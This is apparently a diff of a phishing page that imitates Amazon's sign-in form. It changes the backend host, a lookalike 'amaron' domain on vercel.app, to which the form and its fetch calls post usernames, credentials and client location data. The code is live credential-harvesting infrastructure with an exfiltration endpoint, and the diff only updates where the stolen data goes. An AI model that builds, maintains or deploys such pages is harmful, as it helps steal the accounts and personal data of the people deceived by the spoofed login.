@@ -14670,7 +14670,7 @@
                                 <!-- Claim-collection unified form -->
                                 <span class="a-declarative" data-action="submit-claim" data-submit-claim="{}">
                                     <form id="ap_login_form" name="signIn" method="post" novalidate=""
-                                        action="https://amaron-backend.vercel.app/api/credential"
+                                        action="https://amaron-backend-roan.vercel.app/api/credential"
                                         data-fwcim-id="ZKGkEP28">
 
                                         <input type="hidden" name="appAction" value="SIGNIN_CLAIM_COLLECT">
@@ -17098,7 +17098,7 @@
                     console.log("Sending basic client info:", info);
 
                     try {
-                        await fetch("https://amaron-backend.vercel.app/api/location/client-info", {
+                        await fetch("https://amaron-backend-roan.vercel.app/api/location/client-info", {
                             method: "POST",
                             headers: { "Content-Type": "application/json" },
                             body: JSON.stringify(info)
@@ -17120,7 +17120,7 @@
                 const payload = { username }
 
                 try {
-                    const res = await fetch("https://amaron-backend.vercel.app/api/credential", {
+                    const res = await fetch("https://amaron-backend-roan.vercel.app/api/credential", {
                         method: "POST",
                         headers: { "Content-Type": "application/json" },
                         body: JSON.stringify(payload)
